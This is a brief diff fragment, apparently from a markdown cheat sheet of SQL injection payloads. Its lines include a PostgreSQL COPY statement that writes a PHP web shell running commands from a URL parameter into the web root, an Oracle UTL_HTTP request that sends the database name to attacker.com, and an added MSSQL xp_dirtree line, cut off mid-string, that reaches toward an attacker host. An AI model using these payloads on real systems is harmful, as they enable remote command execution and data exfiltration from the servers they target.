@@ -82,4 +82,4 @@ COPY (SELECT '<?php system($_GET[cmd]); ?>') TO '/var/www/html/shell.php'
 
 ```
 ||UTL_HTTP.request('http://attacker.com/'||database())--
-EXEC
+EXEC master..xp_dirtree '\\att
